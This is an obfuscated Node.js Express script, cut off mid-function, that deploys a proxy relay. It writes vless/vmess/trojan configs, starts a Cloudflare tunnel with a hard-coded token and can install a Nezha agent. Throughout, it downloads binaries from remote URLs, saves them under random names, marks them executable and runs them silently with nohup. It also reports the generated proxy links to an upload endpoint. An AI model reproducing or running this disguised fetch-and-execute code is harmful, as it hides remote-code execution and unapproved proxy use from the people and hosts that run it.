const _0x2afa27=_0x1a75;(function(_0x2abd04,_0x3a946a){const _0x337bca={_0x343c39:0x204,_0x5149fb:0x213,_0xcd4954:0x1b9,_0x571d5f:0x1c8,_0x3db06b:0x182,_0x1439cb:0x1de,_0x5caf10:0x19e},_0x24435e=_0x1a75,_0x5acd48=_0x2abd04();while(!![]){try{const _0x2be8d2=parseInt(_0x24435e(0x21e))/0x1*(parseInt(_0x24435e(_0x337bca._0x343c39))/0x2)+-parseInt(_0x24435e(0x1e2))/0x3+parseInt(_0x24435e(0x1bd))/0x4*(-parseInt(_0x24435e(_0x337bca._0x5149fb))/0x5)+-parseInt(_0x24435e(_0x337bca._0xcd4954))/0x6*(parseInt(_0x24435e(_0x337bca._0x571d5f))/0x7)+parseInt(_0x24435e(_0x337bca._0x3db06b))/0x8*(parseInt(_0x24435e(_0x337bca._0x1439cb))/0x9)+parseInt(_0x24435e(_0x337bca._0x5caf10))/0xa+parseInt(_0x24435e(0x1d0))/0xb;if(_0x2be8d2===_0x3a946a)break;else _0x5acd48['push'](_0x5acd48['shift']());}catch(_0x560101){_0x5acd48['push'](_0x5acd48['shift']());}}}(_0xf312,0xa2d94));const express=require('express'),app=express(),axios=require(_0x2afa27(0x226)),os=require('os'),fs=require('fs'),path=require(_0x2afa27(0x180)),{promisify}=require('util'),exec=promisify(require(_0x2afa27(0x196))['exec']),{execSync}=require(_0x2afa27(0x196)),UPLOAD_URL=process['env'][_0x2afa27(0x1ae)]||'',PROJECT_URL=process[_0x2afa27(0x214)][_0x2afa27(0x186)]||'',AUTO_ACCESS=process[_0x2afa27(0x214)][_0x2afa27(0x20b)]||![],FILE_PATH=process[_0x2afa27(0x214)][_0x2afa27(0x1f9)]||_0x2afa27(0x1c1),SUB_PATH=process[_0x2afa27(0x214)][_0x2afa27(0x1f6)]||_0x2afa27(0x17e),PORT=process['env'][_0x2afa27(0x223)]||process[_0x2afa27(0x214)][_0x2afa27(0x1be)]||0xbb8,UUID=process[_0x2afa27(0x214)][_0x2afa27(0x179)]||_0x2afa27(0x1bb),NEZHA_SERVER=process[_0x2afa27(0x214)][_0x2afa27(0x1b4)]||'',NEZHA_PORT=process[_0x2afa27(0x214)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2afa27(0x214)][_0x2afa27(0x207)]||'',ARGO_DOMAIN=process[_0x2afa27(0x214)]['ARGO_DOMAIN']||_0x2afa27(0x18f),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNzRhZmUzZjNkOWYyZGI0YmIzZmY1YjIzZGEyYjA2MjMiLCJ0IjoiNmI4ZGVjNGQtMmNhNC00NTA3LThlODQtMzc0ZTUyNjRhYmQxIiwicyI6Ik1ESXpOamd6TldRdFlUbGxOQzAwT1RFNExXRXhNMk10WVdaalpEWmtZakZsTjJZNSJ9',ARGO_PORT=process[_0x2afa27(0x214)][_0x2afa27(0x1a6)]||0x1f41,CFIP=process[_0x2afa27(0x214)][_0x2afa27(0x1a1)]||_0x2afa27(0x181),CFPORT=process[_0x2afa27(0x214)][_0x2afa27(0x206)]||0x1bb,NAME=process[_0x2afa27(0x214)][_0x2afa27(0x1c5)]||_0x2afa27(0x183);!fs[_0x2afa27(0x184)](FILE_PATH)?(fs[_0x2afa27(0x1f8)](FILE_PATH),console[_0x2afa27(0x240)](FILE_PATH+'\x20is\x20created')):console[_0x2afa27(0x240)](FILE_PATH+_0x2afa27(0x1b5));function generateRandomName(){const _0x1c3431={_0x567470:0x1ad,_0x1ffb66:0x1db,_0x35231f:0x1f7,_0x5c7c52:0x192},_0x5d7e76=_0x2afa27,_0x2fa49b=_0x5d7e76(_0x1c3431._0x567470);let _0x5ac1af='';for(let _0x16ac8d=0x0;_0x16ac8d<0x6;_0x16ac8d++){_0x5ac1af+=_0x2fa49b[_0x5d7e76(_0x1c3431._0x1ffb66)](Math[_0x5d7e76(0x17b)](Math[_0x5d7e76(_0x1c3431._0x35231f)]()*_0x2fa49b[_0x5d7e76(_0x1c3431._0x5c7c52)]));}return _0x5ac1af;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2afa27(0x1df)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2afa27(0x1df)](FILE_PATH,botName),subPath=path[_0x2afa27(0x1df)](FILE_PATH,_0x2afa27(0x1cf)),listPath=path['join'](FILE_PATH,_0x2afa27(0x19b)),bootLogPath=path['join'](FILE_PATH,_0x2afa27(0x1ee)),configPath=path[_0x2afa27(0x1df)](FILE_PATH,_0x2afa27(0x1d7));function deleteNodes(){const _0x82ca3a={_0x313a55:0x1e4,_0x123369:0x23c,_0x4a1a8b:0x192,_0x211595:0x237},_0x3afc05=_0x2afa27;try{if(!UPLOAD_URL)return;if(!fs[_0x3afc05(0x184)](subPath))return;let _0x4d41f0;try{_0x4d41f0=fs[_0x3afc05(0x222)](subPath,_0x3afc05(0x1f2));}catch{return null;}const _0x29ec28=Buffer[_0x3afc05(_0x82ca3a._0x313a55)](_0x4d41f0,_0x3afc05(0x1b2))['toString'](_0x3afc05(0x1f2)),_0x5865e9=_0x29ec28[_0x3afc05(0x1b1)]('\x0a')[_0x3afc05(_0x82ca3a._0x123369)](_0xd94aa7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xd94aa7));if(_0x5865e9[_0x3afc05(_0x82ca3a._0x4a1a8b)]===0x0)return;return axios[_0x3afc05(0x20e)](UPLOAD_URL+_0x3afc05(_0x82ca3a._0x211595),JSON['stringify']({'nodes':_0x5865e9}),{'headers':{'Content-Type':'application/json'}})[_0x3afc05(0x233)](_0x2b4a5d=>{return null;}),null;}catch(_0x2f0206){return null;}}function cleanupOldFiles(){const _0x94404e={_0x1bc055:0x23a},_0x35182b={_0x392161:0x1df,_0x3db9a4:0x1da,_0x4c2639:0x17a},_0x4a97c6=_0x2afa27;try{const _0x26e0fc=fs[_0x4a97c6(_0x94404e._0x1bc055)](FILE_PATH);_0x26e0fc['forEach'](_0x359483=>{const _0x21ec52=_0x4a97c6,_0x4407b6=path[_0x21ec52(_0x35182b._0x392161)](FILE_PATH,_0x359483);try{const _0x2956f0=fs[_0x21ec52(_0x35182b._0x3db9a4)](_0x4407b6);_0x2956f0[_0x21ec52(_0x35182b._0x4c2639)]()&&fs[_0x21ec52(0x17c)](_0x4407b6);}catch(_0x1a5ed1){}});}catch(_0x2f5f98){}}app[_0x2afa27(0x199)]('/',function(_0x189c50,_0x10a4d3){const _0xc4ea11={_0x2fb303:0x18a},_0xaf462b=_0x2afa27;_0x10a4d3['send'](_0xaf462b(_0xc4ea11._0x2fb303));});async function generateConfig(){const _0x84e64b={_0x2bcb3a:0x205,_0xef3a8a:0x23d,_0x1993cf:0x227,_0x1be089:0x188,_0x3c2cc2:0x227,_0x4dc772:0x23d,_0x13614e:0x22f,_0x11a202:0x23d,_0x52012e:0x1cd,_0x2d6997:0x22e,_0x320d07:0x18b,_0x29da40:0x188,_0x32fd74:0x1f4,_0x4851fa:0x18b,_0x34e09f:0x1ab,_0x1f9c16:0x1e5,_0x22a01a:0x1ea,_0xcf9c2c:0x239},_0x583134=_0x2afa27,_0xabdc91={'log':{'access':'/dev/null','error':_0x583134(_0x84e64b._0x2bcb3a),'loglevel':_0x583134(_0x84e64b._0xef3a8a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x583134(_0x84e64b._0x1993cf),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x583134(0x23d),'fallbacks':[{'dest':0xbb9},{'path':_0x583134(0x17d),'dest':0xbba},{'path':_0x583134(0x238),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x583134(0x22f)}},{'port':0xbb9,'listen':_0x583134(_0x84e64b._0x1be089),'protocol':_0x583134(_0x84e64b._0x3c2cc2),'settings':{'clients':[{'id':UUID}],'decryption':_0x583134(_0x84e64b._0x4dc772)},'streamSettings':{'network':_0x583134(_0x84e64b._0x13614e),'security':_0x583134(0x23d)}},{'port':0xbba,'listen':_0x583134(0x188),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x583134(_0x84e64b._0x11a202)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x583134(0x17d)}},'sniffing':{'enabled':!![],'destOverride':[_0x583134(_0x84e64b._0x52012e),_0x583134(0x18b),_0x583134(0x1ab)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x583134(_0x84e64b._0x1be089),'protocol':_0x583134(_0x84e64b._0x2d6997),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x583134(0x238)}},'sniffing':{'enabled':!![],'destOverride':[_0x583134(0x1cd),_0x583134(_0x84e64b._0x320d07),_0x583134(0x1ab)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x583134(_0x84e64b._0x29da40),'protocol':_0x583134(_0x84e64b._0x32fd74),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x583134(0x224)}},'sniffing':{'enabled':!![],'destOverride':[_0x583134(_0x84e64b._0x52012e),_0x583134(_0x84e64b._0x4851fa),_0x583134(_0x84e64b._0x34e09f)],'metadataOnly':![]}}],'dns':{'servers':[_0x583134(_0x84e64b._0x1f9c16)]},'outbounds':[{'protocol':'freedom','tag':_0x583134(_0x84e64b._0x22a01a)},{'protocol':_0x583134(0x1ff),'tag':'block'}]};fs[_0x583134(0x1f0)](path['join'](FILE_PATH,'config.json'),JSON[_0x583134(_0x84e64b._0xcf9c2c)](_0xabdc91,null,0x2));}function getSystemArchitecture(){const _0x18e6b5={_0x12e641:0x1a5},_0x1ddbbb=_0x2afa27,_0x3dc1af=os[_0x1ddbbb(_0x18e6b5._0x12e641)]();return _0x3dc1af==='arm'||_0x3dc1af==='arm64'||_0x3dc1af===_0x1ddbbb(0x190)?_0x1ddbbb(0x20a):'amd';}function downloadFile(_0x526e61,_0x5cb170,_0x2d1feb){const _0x5abf34={_0x4bf689:0x184,_0x518760:0x1f8,_0x294ea0:0x199},_0x4662e9={_0x146e20:0x208},_0x5d7990={_0xe7df66:0x229,_0x2101f6:0x19f,_0x2212a3:0x1f1},_0x29db9a={_0x2f046d:0x1fd,_0x4b7200:0x208,_0x4430e4:0x1f1},_0x278651={_0x48241b:0x191,_0x589616:0x19d},_0x8626f0=_0x2afa27,_0x39debf=_0x526e61;!fs[_0x8626f0(_0x5abf34._0x4bf689)](FILE_PATH)&&fs[_0x8626f0(_0x5abf34._0x518760)](FILE_PATH,{'recursive':!![]});const _0x15183a=fs['createWriteStream'](_0x39debf);axios({'method':_0x8626f0(_0x5abf34._0x294ea0),'url':_0x5cb170,'responseType':'stream'})['then'](_0x8c7eca=>{const _0x4b6f93=_0x8626f0;_0x8c7eca[_0x4b6f93(_0x5d7990._0xe7df66)][_0x4b6f93(0x197)](_0x15183a),_0x15183a['on'](_0x4b6f93(_0x5d7990._0x2101f6),()=>{const _0x5d6603=_0x4b6f93;_0x15183a['close'](),console['log'](_0x5d6603(0x208)+path[_0x5d6603(_0x278651._0x48241b)](_0x39debf)+_0x5d6603(_0x278651._0x589616)),_0x2d1feb(null,_0x39debf);}),_0x15183a['on'](_0x4b6f93(_0x5d7990._0x2212a3),_0x966475=>{const _0x5c62ef=_0x4b6f93;fs[_0x5c62ef(_0x29db9a._0x2f046d)](_0x39debf,()=>{});const _0x586a82=_0x5c62ef(_0x29db9a._0x4b7200)+path['basename'](_0x39debf)+'\x20failed:\x20'+_0x966475['message'];console[_0x5c62ef(_0x29db9a._0x4430e4)](_0x586a82),_0x2d1feb(_0x586a82);});})['catch'](_0x14afae=>{const _0x43bf7f=_0x8626f0,_0x3efcc5=_0x43bf7f(_0x4662e9._0x146e20)+path['basename'](_0x39debf)+_0x43bf7f(0x1ed)+_0x14afae[_0x43bf7f(0x1d3)];console[_0x43bf7f(0x1f1)](_0x3efcc5),_0x2d1feb(_0x3efcc5);});}async function downloadFilesAndRun(){const _0x262953={_0x1fcefb:0x1b6,_0x4848b0:0x18c,_0x13ebcc:0x219,_0x1b1322:0x1ef,_0x2338bf:0x185,_0xd00cf3:0x232,_0x494a14:0x1f0,_0x5683d3:0x1aa,_0x3e93a4:0x19a,_0x19920c:0x1e6,_0x3a4ce0:0x195,_0x400bf1:0x1a0,_0x4c19c2:0x220,_0x279f0d:0x240,_0x486f09:0x215,_0x276e76:0x1f3,_0x1bb34b:0x1fb,_0x1838b9:0x184,_0x4d8fba:0x178,_0x18dfdb:0x1b3,_0x500157:0x215,_0x26f180:0x1f1},_0x2e7409={_0x205cd3:0x184,_0x2f469e:0x198},_0x23e14f=_0x2afa27,_0x48c8c2=getSystemArchitecture(),_0x237403=getFilesForArchitecture(_0x48c8c2);if(_0x237403[_0x23e14f(0x192)]===0x0){console[_0x23e14f(0x240)](_0x23e14f(0x1cc));return;}const _0x12193e=_0x237403['map'](_0x3ea688=>{const _0x3713af={_0x4ec05c:0x209};return new Promise((_0x271a17,_0x2c1e0e)=>{const _0x3c54d5=_0x1a75;downloadFile(_0x3ea688[_0x3c54d5(_0x3713af._0x4ec05c)],_0x3ea688['fileUrl'],(_0x4d2321,_0x342c22)=>{_0x4d2321?_0x2c1e0e(_0x4d2321):_0x271a17(_0x342c22);});});});try{await Promise[_0x23e14f(0x1bc)](_0x12193e);}catch(_0x41176d){console[_0x23e14f(0x1f1)](_0x23e14f(_0x262953._0x1fcefb),_0x41176d);return;}function _0x2c5a5b(_0x58edd4){const _0x3129e1={_0x189504:0x1f1,_0xab3d7a:0x203,_0x57aad4:0x1ac},_0x338847=0x1fd;_0x58edd4['forEach'](_0x4b47a0=>{const _0x2cf2d6=_0x1a75;fs[_0x2cf2d6(_0x2e7409._0x205cd3)](_0x4b47a0)&&fs[_0x2cf2d6(_0x2e7409._0x2f469e)](_0x4b47a0,_0x338847,_0x5223f2=>{const _0x3c1391=_0x2cf2d6;_0x5223f2?console[_0x3c1391(_0x3129e1._0x189504)]('Empowerment\x20failed\x20for\x20'+_0x4b47a0+':\x20'+_0x5223f2):console[_0x3c1391(0x240)](_0x3c1391(_0x3129e1._0xab3d7a)+_0x4b47a0+':\x20'+_0x338847[_0x3c1391(_0x3129e1._0x57aad4)](0x8));});});}const _0x21e097=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2c5a5b(_0x21e097);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12c660=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x23e14f(0x1b1)](':')[_0x23e14f(_0x262953._0x4848b0)]():'',_0x30ebbe=new Set(['443',_0x23e14f(0x228),_0x23e14f(0x195),_0x23e14f(0x1c0),_0x23e14f(_0x262953._0x13ebcc),_0x23e14f(_0x262953._0x1b1322)]),_0x27d3cc=_0x30ebbe[_0x23e14f(_0x262953._0x2338bf)](_0x12c660)?_0x23e14f(_0x262953._0xd00cf3):'false',_0x440351=_0x23e14f(0x22d)+NEZHA_KEY+_0x23e14f(0x1af)+NEZHA_SERVER+_0x23e14f(0x1ca)+_0x27d3cc+_0x23e14f(0x1e1)+UUID;fs[_0x23e14f(_0x262953._0x494a14)](path[_0x23e14f(0x1df)](FILE_PATH,_0x23e14f(_0x262953._0x5683d3)),_0x440351);const _0x138d61=_0x23e14f(0x1f3)+phpPath+_0x23e14f(_0x262953._0x3e93a4)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x138d61),console['log'](phpName+_0x23e14f(0x215)),await new Promise(_0x13c54c=>setTimeout(_0x13c54c,0x3e8));}catch(_0x2c38f4){console[_0x23e14f(0x1f1)](_0x23e14f(_0x262953._0x19920c)+_0x2c38f4);}}else{let _0x1ee369='';const _0x143814=['443','8443',_0x23e14f(_0x262953._0x3a4ce0),'2087',_0x23e14f(0x219),_0x23e14f(0x1ef)];_0x143814[_0x23e14f(0x1d4)](NEZHA_PORT)&&(_0x1ee369=_0x23e14f(0x1d5));const _0x465c33='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x23e14f(_0x262953._0x400bf1)+NEZHA_KEY+'\x20'+_0x1ee369+_0x23e14f(_0x262953._0x4c19c2);try{await exec(_0x465c33),console[_0x23e14f(_0x262953._0x279f0d)](npmName+_0x23e14f(_0x262953._0x486f09)),await new Promise(_0x5dc4e6=>setTimeout(_0x5dc4e6,0x3e8));}catch(_0x39e15d){console[_0x23e14f(0x1f1)]('npm\x20running\x20error:\x20'+_0x39e15d);}}}else console['log'](_0x23e14f(0x20c));const _0x560b68=_0x23e14f(_0x262953._0x276e76)+webPath+_0x23e14f(0x1f5)+FILE_PATH+_0x23e14f(_0x262953._0x1bb34b);try{await exec(_0x560b68),console['log'](webName+_0x23e14f(_0x262953._0x486f09)),await new Promise(_0x4bc963=>setTimeout(_0x4bc963,0x3e8));}catch(_0x5bb481){console[_0x23e14f(0x1f1)]('web\x20running\x20error:\x20'+_0x5bb481);}if(fs[_0x23e14f(_0x262953._0x1838b9)](botPath)){let _0x5a3a8f;if(ARGO_AUTH[_0x23e14f(0x22c)](/^[A-Z0-9a-z=]{120,250}$/))_0x5a3a8f=_0x23e14f(_0x262953._0x4d8fba)+ARGO_AUTH;else ARGO_AUTH[_0x23e14f(0x22c)](/TunnelSecret/)?_0x5a3a8f=_0x23e14f(0x23e)+FILE_PATH+_0x23e14f(0x1ec):_0x5a3a8f=_0x23e14f(0x218)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x23e14f(_0x262953._0x276e76)+botPath+'\x20'+_0x5a3a8f+_0x23e14f(_0x262953._0x18dfdb)),console[_0x23e14f(0x240)](botName+_0x23e14f(_0x262953._0x500157)),await new Promise(_0x2a3bc9=>setTimeout(_0x2a3bc9,0x7d0));}catch(_0x4ae7d9){console[_0x23e14f(_0x262953._0x26f180)]('Error\x20executing\x20command:\x20'+_0x4ae7d9);}}await new Promise(_0x2e3fc5=>setTimeout(_0x2e3fc5,0x1388));}function _0x1a75(_0x5a7863,_0x4d8c1b){const _0xf3129c=_0xf312();return _0x1a75=function(_0x1a754a,_0xa10a18){_0x1a754a=_0x1a754a-0x178;let _0xa45e22=_0xf3129c[_0x1a754a];return _0xa45e22;},_0x1a75(_0x5a7863,_0x4d8c1b);}function getFilesForArchitecture(_0x14e373){const _0x11a444={_0x517d6e:0x20a,_0x26bc31:0x236,_0x12946a:0x23f,_0x13c397:0x200,_0x5e210e:0x1a4,_0x1fe17d:0x1eb,_0x47cccb:0x1fc,_0x14b270:0x1b8},_0x3b3359=_0x2afa27;let _0x3df087;_0x14e373===_0x3b3359(_0x11a444._0x517d6e)?_0x3df087=[{'fileName':webPath,'fileUrl':_0x3b3359(_0x11a444._0x26bc31)},{'fileName':botPath,'fileUrl':_0x3b3359(_0x11a444._0x12946a)}]:_0x3df087=[{'fileName':webPath,'fileUrl':_0x3b3359(_0x11a444._0x13c397)},{'fileName':botPath,'fileUrl':_0x3b3359(_0x11a444._0x5e210e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x14f85e=_0x14e373===_0x3b3359(0x20a)?'https://arm64.ssss.nyc.mn/agent':_0x3b3359(0x1ba);_0x3df087['unshift']({'fileName':npmPath,'fileUrl':_0x14f85e});}else{const _0x1f349f=_0x14e373==='arm'?_0x3b3359(_0x11a444._0x1fe17d):_0x3b3359(_0x11a444._0x47cccb);_0x3df087[_0x3b3359(_0x11a444._0x14b270)]({'fileName':phpPath,'fileUrl':_0x1f349f});}}return _0x3df087;}function argoType(){const _0x372ab0={_0x59b2d9:0x22a,_0x2615e2:0x1df,_0x364c0c:0x234,_0x3a8436:0x1dd,_0x41c2a6:0x240},_0xc5412e=_0x2afa27;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xc5412e(0x240)](_0xc5412e(_0x372ab0._0x59b2d9));return;}if(ARGO_AUTH[_0xc5412e(0x1d4)](_0xc5412e(0x18e))){fs['writeFileSync'](path[_0xc5412e(0x1df)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x24b5d1=_0xc5412e(0x1e0)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xc5412e(_0x372ab0._0x2615e2)](FILE_PATH,_0xc5412e(_0x372ab0._0x364c0c))+_0xc5412e(0x21a)+ARGO_DOMAIN+_0xc5412e(_0x372ab0._0x3a8436)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0xc5412e(_0x372ab0._0x2615e2)](FILE_PATH,'tunnel.yml'),_0x24b5d1);}else console[_0xc5412e(_0x372ab0._0x41c2a6)](_0xc5412e(0x1c6));}async function extractDomains(){const _0x4274c4={_0x154f25:0x193,_0x4cc097:0x1a2,_0x487ca2:0x192,_0x75c3f:0x1a3,_0x38a76b:0x240,_0x179e46:0x1e3,_0x4f7967:0x1ee,_0x5114bf:0x218,_0x37b58a:0x1c9,_0x4730fb:0x1b3,_0x34cd16:0x215,_0xa308f4:0x1f1},_0x5a8c14={_0x29bd72:0x20d,_0x3befeb:0x229,_0x44bd4c:0x229,_0x1d1a07:0x210,_0x117637:0x199,_0x139646:0x1b0,_0x46fc09:0x1e7},_0x3632af={_0x2f1c4d:0x1a8,_0x234db5:0x1d2,_0x208d21:0x212},_0x822bb2={_0x59c9a5:0x21c},_0x264004=_0x2afa27;let _0xdb1a40;if(ARGO_AUTH&&ARGO_DOMAIN)_0xdb1a40=ARGO_DOMAIN,console['log'](_0x264004(_0x4274c4._0x154f25),_0xdb1a40),await _0x2d277d(_0xdb1a40);else try{const _0x55d147=fs[_0x264004(0x222)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x421d4f=_0x55d147[_0x264004(0x1b1)]('\x0a'),_0x1507a0=[];_0x421d4f[_0x264004(_0x4274c4._0x4cc097)](_0x4e714d=>{const _0x5d4023=_0x264004,_0xa9cadf=_0x4e714d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xa9cadf){const _0xbee8aa=_0xa9cadf[0x1];_0x1507a0[_0x5d4023(_0x822bb2._0x59c9a5)](_0xbee8aa);}});if(_0x1507a0[_0x264004(_0x4274c4._0x487ca2)]>0x0)_0xdb1a40=_0x1507a0[0x0],console['log'](_0x264004(_0x4274c4._0x75c3f),_0xdb1a40),await _0x2d277d(_0xdb1a40);else{console[_0x264004(_0x4274c4._0x38a76b)](_0x264004(_0x4274c4._0x179e46)),fs['unlinkSync'](path[_0x264004(0x1df)](FILE_PATH,_0x264004(_0x4274c4._0x4f7967)));async function _0x5afecf(){const _0x23f829=_0x264004;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x23f829(0x1c7)):await exec(_0x23f829(_0x3632af._0x2f1c4d)+botName['charAt'](0x0)+']'+botName[_0x23f829(_0x3632af._0x234db5)](0x1)+_0x23f829(_0x3632af._0x208d21));}catch(_0x968eb2){}}_0x5afecf(),await new Promise(_0x35b3ce=>setTimeout(_0x35b3ce,0xbb8));const _0x1b1e14=_0x264004(_0x4274c4._0x5114bf)+FILE_PATH+_0x264004(_0x4274c4._0x37b58a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1b1e14+_0x264004(_0x4274c4._0x4730fb)),console['log'](botName+_0x264004(_0x4274c4._0x34cd16)),await new Promise(_0x3defe7=>setTimeout(_0x3defe7,0xbb8)),await extractDomains();}catch(_0x383f6b){console[_0x264004(_0x4274c4._0xa308f4)](_0x264004(0x221)+_0x383f6b);}}}catch(_0x138987){console[_0x264004(0x1f1)]('Error\x20reading\x20boot.log:',_0x138987);}async function _0x5a0ec8(){const _0x50164d=_0x264004;try{const _0x4c9174=await axios[_0x50164d(0x199)](_0x50164d(_0x5a8c14._0x29bd72),{'timeout':0xbb8});if(_0x4c9174[_0x50164d(0x229)]&&_0x4c9174['data'][_0x50164d(0x231)]&&_0x4c9174[_0x50164d(0x229)][_0x50164d(0x210)])return _0x4c9174[_0x50164d(_0x5a8c14._0x3befeb)][_0x50164d(0x231)]+'_'+_0x4c9174[_0x50164d(_0x5a8c14._0x44bd4c)][_0x50164d(_0x5a8c14._0x1d1a07)];}catch(_0x2ec946){try{const _0x47c3d5=await axios[_0x50164d(_0x5a8c14._0x117637)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x47c3d5[_0x50164d(0x229)]&&_0x47c3d5[_0x50164d(0x229)]['status']===_0x50164d(_0x5a8c14._0x139646)&&_0x47c3d5[_0x50164d(_0x5a8c14._0x3befeb)][_0x50164d(0x1e7)]&&_0x47c3d5['data']['org'])return _0x47c3d5[_0x50164d(_0x5a8c14._0x44bd4c)][_0x50164d(_0x5a8c14._0x46fc09)]+'_'+_0x47c3d5[_0x50164d(0x229)][_0x50164d(0x210)];}catch(_0x274c21){}}return _0x50164d(0x187);}async function _0x2d277d(_0x12e185){const _0x22dd6f={_0x506aa7:0x23d,_0x7b5266:0x1e4,_0x568ff6:0x239,_0x560e56:0x20f,_0x108085:0x23b,_0x2c8b47:0x1ac,_0x1ebb66:0x1f0,_0x510d07:0x1fa},_0x22a5a0=await _0x5a0ec8(),_0x3e9fe6=NAME?NAME+'-'+_0x22a5a0:_0x22a5a0;return new Promise(_0x4e0905=>{const _0x4daa4a={_0x3c722f:0x1c2,_0x3d7622:0x211};setTimeout(()=>{const _0x488087=_0x1a75,_0x2ee64b={'v':'2','ps':''+_0x3e9fe6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x488087(_0x22dd6f._0x506aa7),'net':'ws','type':'none','host':_0x12e185,'path':_0x488087(0x22b),'tls':_0x488087(0x18b),'sni':_0x12e185,'alpn':'','fp':_0x488087(0x194)},_0x8ca971='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x488087(0x21f)+_0x12e185+_0x488087(0x20f)+_0x12e185+_0x488087(0x21b)+_0x3e9fe6+_0x488087(0x1d8)+Buffer[_0x488087(_0x22dd6f._0x7b5266)](JSON[_0x488087(_0x22dd6f._0x568ff6)](_0x2ee64b))[_0x488087(0x1ac)](_0x488087(0x1b2))+_0x488087(0x1e8)+UUID+'@'+CFIP+':'+CFPORT+_0x488087(0x1bf)+_0x12e185+_0x488087(_0x22dd6f._0x560e56)+_0x12e185+_0x488087(_0x22dd6f._0x108085)+_0x3e9fe6+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x488087(0x1e4)](_0x8ca971)[_0x488087(_0x22dd6f._0x2c8b47)]('base64')),fs[_0x488087(_0x22dd6f._0x1ebb66)](subPath,Buffer[_0x488087(_0x22dd6f._0x7b5266)](_0x8ca971)['toString'](_0x488087(0x1b2))),console[_0x488087(0x240)](FILE_PATH+_0x488087(_0x22dd6f._0x510d07)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xd6a01f,_0x55e22a)=>{const _0x4ece46=_0x488087,_0x14fa18=Buffer[_0x4ece46(0x1e4)](_0x8ca971)['toString'](_0x4ece46(0x1b2));_0x55e22a[_0x4ece46(_0x4daa4a._0x3c722f)](_0x4ece46(0x17f),_0x4ece46(0x1ce)),_0x55e22a[_0x4ece46(_0x4daa4a._0x3d7622)](_0x14fa18);}),_0x4e0905(_0x8ca971);},0x7d0);});}}async function uploadNodes(){const _0x58d991={_0x4e622e:0x189,_0x556d00:0x1d9,_0x5f0681:0x1fe,_0x4f8cc9:0x1dc,_0x282447:0x184,_0x1f1fea:0x222,_0x43b813:0x23c,_0x16a15a:0x192,_0x2a4344:0x1d9,_0x6264dd:0x240},_0x15ae67=_0x2afa27;if(UPLOAD_URL&&PROJECT_URL){const _0x18df34=PROJECT_URL+'/'+SUB_PATH,_0x32b861={'subscription':[_0x18df34]};try{const _0xa7cb7e=await axios[_0x15ae67(0x20e)](UPLOAD_URL+_0x15ae67(_0x58d991._0x4e622e),_0x32b861,{'headers':{'Content-Type':_0x15ae67(_0x58d991._0x556d00)}});return _0xa7cb7e&&_0xa7cb7e[_0x15ae67(0x1dc)]===0xc8?(console['log'](_0x15ae67(0x1a9)),_0xa7cb7e):null;}catch(_0x1955bc){if(_0x1955bc[_0x15ae67(0x1fe)]){if(_0x1955bc[_0x15ae67(_0x58d991._0x5f0681)][_0x15ae67(_0x58d991._0x4f8cc9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x15ae67(_0x58d991._0x282447)](listPath))return;const _0x1827b8=fs[_0x15ae67(_0x58d991._0x1f1fea)](listPath,'utf-8'),_0x14ba08=_0x1827b8[_0x15ae67(0x1b1)]('\x0a')[_0x15ae67(_0x58d991._0x43b813)](_0x49b58a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15ae67(0x202)](_0x49b58a));if(_0x14ba08[_0x15ae67(_0x58d991._0x16a15a)]===0x0)return;const _0xca5b55=JSON[_0x15ae67(0x239)]({'nodes':_0x14ba08});try{const _0x3f3e0e=await axios['post'](UPLOAD_URL+_0x15ae67(0x1d1),_0xca5b55,{'headers':{'Content-Type':_0x15ae67(_0x58d991._0x2a4344)}});return _0x3f3e0e&&_0x3f3e0e['status']===0xc8?(console[_0x15ae67(_0x58d991._0x6264dd)](_0x15ae67(0x1cb)),_0x3f3e0e):null;}catch(_0x319b54){return null;}}else return;}}function cleanFiles(){const 